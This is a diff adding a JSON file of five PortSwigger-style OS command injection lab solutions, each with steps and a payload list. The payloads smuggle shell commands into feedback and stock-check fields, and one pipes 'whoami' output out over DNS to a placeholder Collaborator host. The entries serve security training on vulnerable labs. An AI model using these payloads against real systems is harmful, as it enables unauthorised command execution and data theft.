@@ -1,0 +1,94 @@
+[
+  {
+    "url": "https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band",
+    "category": "os-command-injection",
+    "title": "Blind OS command injection with out-of-band interaction",
+    "description": "This lab contains a blind OS command injection vulnerability in the feedback function.",
+    "solution_steps": [
+      "Use Burp Suite to intercept and modify the request that submits feedback.",
+      "Modify the email parameter, changing it to: email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||",
+      "Right-click and select \"Insert Collaborator payload\" to insert a Burp Collaborator subdomain where indicated in the modified email parameter."
+    ],
+    "solution": "1. Use Burp Suite to intercept and modify the request that submits feedback.\n2. Modify the email parameter, changing it to: email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||\n3. Right-click and select \"Insert Collaborator payload\" to insert a Burp Collaborator subdomain where indicated in the modified email parameter.",
+    "payloads": [
+      "email",
+      "email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration",
+    "category": "os-command-injection",
+    "title": "Blind OS command injection with out-of-band data exfiltration",
+    "description": "This lab contains a blind OS command injection vulnerability in the feedback function.",
+    "solution_steps": [
+      "Use Burp Suite Professional to intercept and modify the request that submits feedback.",
+      "Go to the Collaborator tab.",
+      "Click \"Copy to clipboard\" to copy a unique Burp Collaborator payload to your clipboard.",
+      "Modify the email parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated: email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||",
+      "Go back to the Collaborator tab, and click \"Poll now\". You should see some DNS interactions that were initiated by the application as the result of your payload. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.",
+      "Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Collaborator tab. The full domain name that was looked up is shown in the Description tab for the interaction.",
+      "To complete the lab, enter the name of the current user."
+    ],
+    "solution": "1. Use Burp Suite Professional to intercept and modify the request that submits feedback.\n2. Go to the Collaborator tab.\n3. Click \"Copy to clipboard\" to copy a unique Burp Collaborator payload to your clipboard.\n4. Modify the email parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated: email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||\n5. Go back to the Collaborator tab, and click \"Poll now\". You should see some DNS interactions that were initiated by the application as the result of your payload. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.\n6. Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Collaborator tab. The full domain name that was looked up is shown in the Description tab for the interaction.\n7. To complete the lab, enter the name of the current user.",
+    "payloads": [
+      "whoami",
+      "email",
+      "email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection",
+    "category": "os-command-injection",
+    "title": "Blind OS command injection with output redirection",
+    "description": "This lab contains a blind OS command injection vulnerability in the feedback function.",
+    "solution_steps": [
+      "Use Burp Suite to intercept and modify the request that submits feedback.",
+      "Modify the email parameter, changing it to: email=||whoami>/var/www/images/output.txt||",
+      "Now use Burp Suite to intercept and modify the request that loads an image of a product.",
+      "Modify the filename parameter, changing the value to the name of the file you specified for the output of the injected command: filename=output.txt",
+      "Observe that the response contains the output from the injected command."
+    ],
+    "solution": "1. Use Burp Suite to intercept and modify the request that submits feedback.\n2. Modify the email parameter, changing it to: email=||whoami>/var/www/images/output.txt||\n3. Now use Burp Suite to intercept and modify the request that loads an image of a product.\n4. Modify the filename parameter, changing the value to the name of the file you specified for the output of the injected command: filename=output.txt\n5. Observe that the response contains the output from the injected command.",
+    "payloads": [
+      "/var/www/images/",
+      "whoami",
+      "email",
+      "email=||whoami>/var/www/images/output.txt||",
+      "filename",
+      "filename=output.txt"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays",
+    "category": "os-command-injection",
+    "title": "Blind OS command injection with time delays",
+    "description": "This lab contains a blind OS command injection vulnerability in the feedback function.",
+    "solution_steps": [
+      "Use Burp Suite to intercept and modify the request that submits feedback.",
+      "Modify the email parameter, changing it to: email=x||ping+-c+10+127.0.0.1||",
+      "Observe that the response takes 10 seconds to return."
+    ],
+    "solution": "1. Use Burp Suite to intercept and modify the request that submits feedback.\n2. Modify the email parameter, changing it to: email=x||ping+-c+10+127.0.0.1||\n3. Observe that the response takes 10 seconds to return.",
+    "payloads": [
+      "email",
+      "email=x||ping+-c+10+127.0.0.1||"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/os-command-injection/lab-simple",
+    "category": "os-command-injection",
+    "title": "OS command injection, simple case",
+    "description": "This lab contains an OS command injection vulnerability in the product stock checker.",
+    "solution_steps": [
+      "Use Burp Suite to intercept and modify a request that checks the stock level.",
+      "Modify the storeID parameter, giving it the value 1|whoami .",
+      "Observe that the response contains the name of the current user."
+    ],
+    "solution": "1. Use Burp Suite to intercept and modify a request that checks the stock level.\n2. Modify the storeID parameter, giving it the value 1|whoami .\n3. Observe that the response contains the name of the current user.",
+    "payloads": [
+      "whoami",
+      "storeID",
+      "1|whoami"
+    ]
+  }
+]
